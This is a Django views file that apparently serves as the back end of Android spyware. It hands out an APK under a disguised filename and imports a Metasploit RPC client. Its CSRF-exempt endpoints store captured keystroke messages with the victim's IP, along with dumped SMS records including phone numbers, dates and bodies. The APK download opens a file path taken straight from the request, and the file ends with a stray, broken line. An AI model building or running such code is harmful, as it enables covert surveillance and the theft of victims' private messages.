from django.http import HttpResponse, HttpResponseRedirect
from django.template import loader
from django.urls import reverse
from django.views.decorators.csrf import csrf_protect, csrf_exempt
from django.http import HttpResponse
from django.template import RequestContext
import threading
import os
import requests
import json
from back.models import Messages, dump_sms

from pymetasploit3.msfrpc import MsfRpcClient
from rest_framework.response import Response
from rest_framework import status, permissions
from django.views.decorators.csrf import csrf_exempt
import datetime


def get_apk_file(request, apk_name):
    apk_file = open(f"{apk_name}.apk", "rb")
    response = HttpResponse(apk_file, content_type="application/vnd.android.package-archive")
    response["Content-Disposition"] = 'attachment; filename="android5.apk"'
    return response


@csrf_exempt
def key(request):
    req = json.loads(request.body)
    try:
        Messages.objects.create(message=req["body"], ip=request.META["REMOTE_ADDR"])
        return HttpResponse("OK")
    except:
        return HttpResponse("Error")


@csrf_exempt
def sms(request):
    content = json.loads(request.body.decode().replace("'", '"'))
    print("content: ", content)
    try:
        dump_sms.objects.create(
            sms_type=content["type"],
            phone_number=content["address"],
            date=datetime.datetime.fromtimestamp(int(content["date"]) / 1000.0).strftime("%Y-%m-%d %H:%M:%S"),
            status=content["status"],
            body=content["body"],
        )
        return HttpResponse("OK")
    except:
        return HttpResponse("Error")


TypeError("a bytes-like object is required, not 'str'")
